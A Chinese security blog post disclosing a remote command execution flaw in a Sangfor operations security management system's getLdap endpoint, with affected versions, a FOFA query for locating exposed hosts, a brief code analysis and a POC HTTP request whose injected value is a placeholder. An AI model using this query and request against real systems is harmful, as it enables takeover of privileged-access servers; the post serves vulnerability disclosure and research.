---
title: "深信服运维安全管理系统 getLdap 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html
asset_dir: assets/深信服运维安全管理系统-getldap-远程命令执行漏洞
---

# 深信服运维安全管理系统 getLdap 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/6 08:41
* 254浏览
* [0评论](#comment)
* 6分钟阅读

深入探索

服务器

软件

VPN服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 getLdap 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

深入探索

漏洞扫描服务

安全研究工具

安全

看下 `com.sbr.fort.web.controller.user.FortLdapUserController#getLdap`的实现逻辑

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-001-972afb145925.webp)](https://image.mrxn.net/31887e39155e42eaaa3bd89287cd6c93.webp)

参数**ldapIp**被直接拼接在**bash**脚本后面，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/user;help/getLdap HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

ldapIp=RCE_POC
```

访问命令执行结果文件

漏洞修复方案

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-003-c9451bff8030.webp)](https://image.mrxn.net/b34bebef295247b1ae8641efd11e7760.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-getLdap-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

文件大小转换

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-getLdap-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 